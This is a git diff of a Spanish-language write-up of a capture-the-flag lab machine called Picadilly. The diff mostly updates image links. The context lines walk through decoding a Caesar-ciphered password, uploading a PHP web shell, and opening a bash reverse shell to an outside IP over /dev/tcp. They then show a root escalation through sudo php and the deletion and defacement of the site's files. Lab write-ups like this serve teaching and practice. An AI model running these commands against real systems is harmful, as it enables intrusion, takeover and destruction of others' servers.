@@ -1,5 +1,5 @@
 
-![[20250825191353.png]]
+![[20250825191353.png]](picadilly-images/20250825191353.png)
 
 # Fase de reconocimiento
 
@@ -15,32 +15,32 @@ una vez sabemos los puertos que están abiertos vamos a realizar un segundo esca
 ```bash
 nmap -p80,443 -sCV 172.17.0.2 -oN targeted
 ```
-![[20250825191755.png]]
+![[20250825191755.png]](picadilly-images/20250825191755.png)
 
 vemos que tenemos los puertos 80 y 443 abiertos y que ambos son http y https por lo que vamos a ver que hay en la web empezando por el puerto 80
 
 
-![[20250825191845.png]]
+![[20250825191845.png]](picadilly-images/20250825191845.png)
 
 por el puerto 80 vemos esta pagina donde hay un archivo backup.txt veamos que contiene
 
-![[20250825191920.png]]
+![[20250825191920.png]](picadilly-images/20250825191920.png)
 
 pone que hay un usuario llamado mateo y una contraseña "hdvbfuadcb" pero nos pone que la contraseña esta encriptada con el método de cifrado Cesar. ya que hace referencia a un emperador romano y su cifrado de cambio de letras
 
 utilizamos un decodificador de cifrados y vemos que nos muestra varias posibles combinaciones.
 
-![[20250825192110.png]]
+![[20250825192110.png]](picadilly-images/20250825192110.png)
 
 en una de las partes vemos una contraseña que es "easycrxazy" lo cual guardaremos como posible contraseña pero ahora hay que ver donde ponemos esa contraseña 
 
 vamos a la pagina https que esta en el puerto 443 "https://172.17.0.2:443"
 
-![[20250825192347.png]]
+![[20250825192347.png]](picadilly-images/20250825192347.png)
 
 vemos una pagina con post y anuncios sobre picadilly abajo de la pagina web vemos esto 
 
-![[20250825192422.png]]
+![[20250825192422.png]](picadilly-images/20250825192422.png)
 
 # Fase de explotacion
 
@@ -52,13 +52,13 @@ asi que vamos a tratar de subir un archivo php para inyectar una shell, en nuest
 
 y ahora subiremos el archivo 
 
-![[20250825192614.png]]
+![[20250825192614.png]](picadilly-images/20250825192614.png)
 
 vemos que la pagina nos acepta la subida aunque desde aqui no podemos hacer gran cosa. como es costumbre cuando se suben archivos a una web suele existir un directorio llamado uploads asi que vamos a comprobarlo
 
 ponemos en la URL "https://172.17.0.2/uploads/"
 
-![[20250825192753.png]]
+![[20250825192753.png]](picadilly-images/20250825192753.png)
 
 efectivamente tenemos el directorio y dentro esta nuestra shell asi que pinchamos y probamos a lanzar algun codigo de prueba
 
@@ -66,7 +66,7 @@ efectivamente tenemos el directorio y dentro esta nuestra shell asi que pinchamo
 https://172.17.0.2/uploads/shell.php?cmd=id
 ```
 
-![[20250825192834.png]]
+![[20250825192834.png]](picadilly-images/20250825192834.png)
 
 vemos que efectivamente tenemos shell así que vamos a lanzarnos una shell por el puerto 443
 
@@ -82,7 +82,7 @@ y desde la url ponemos lo siguiente
 https://172.17.0.2/uploads/shell.php?cmd=bash -c "bash -i %26> /dev/tcp/192.168.1.182/443 0>%261"
 ```
 
-![[20250825193051.png]]
+![[20250825193051.png]](picadilly-images/20250825193051.png)
 
 vemos que hemos recibido la shell correctamente 
 
@@ -112,12 +112,12 @@ ahora si tenemos una shell practica
 
 lo primero que haremos ya que tenemos el usuario mateo y la contraseña "easycrxazy" va a ser probarlo 
 
-![[20250825193359.png]]
+![[20250825193359.png]](picadilly-images/20250825193359.png)
 
 vemos que la contraseña no funciona, la logica me dice que la x de la palabra crxazy esta puesta a posta para molestar asi que probaremos a poner la frase easycrazy sin la x 
 
 
-![[20250825193518.png]]
+![[20250825193518.png]](picadilly-images/20250825193518.png)
 
 ahora si vemos que tenemos shell con el usuario mateo 
 
@@ -129,11 +129,11 @@ como siempre empezamos por el comando
 sudo -l 
 ```
 
-![[20250825193607.png]]
+![[20250825193607.png]](picadilly-images/20250825193607.png)
 
 vemos que tenemos permisos de sudo con el binario php asi que vamos a revisar en GTFObins que podemos hacer con esto 
 
-![[20250825193647.png]]
+![[20250825193647.png]](picadilly-images/20250825193647.png)
 
 probamos a lanzar el script por terminal 
 
@@ -141,7 +141,7 @@ probamos a lanzar el script por terminal
 sudo php -r "system('/bin/bash');"
 ```
 
-![[20250825193744.png]]
+![[20250825193744.png]](picadilly-images/20250825193744.png)
 
 y podemos ver que tenemos acceso como root 
 
@@ -167,7 +167,7 @@ luego borraremos todo lo demás para dejar solo nuestros archivos
 rm -r index.php create_post.php picadilly.jpg uploads uploads.php
 ```
 
-![[20250825195456.png]]
+![[20250825195456.png]](picadilly-images/20250825195456.png)
 
 cuando solo tengamos esto vamos al puerto 80 
 
@@ -190,6 +190,6 @@ cp ../html/* .
 
 ahora si podemos ir a la pagina web y refrescar
 
-![[20250825195821.png]]
+![[20250825195821.png]](picadilly-images/20250825195821.png)
 
 aqui podemos ver nuestra firma.
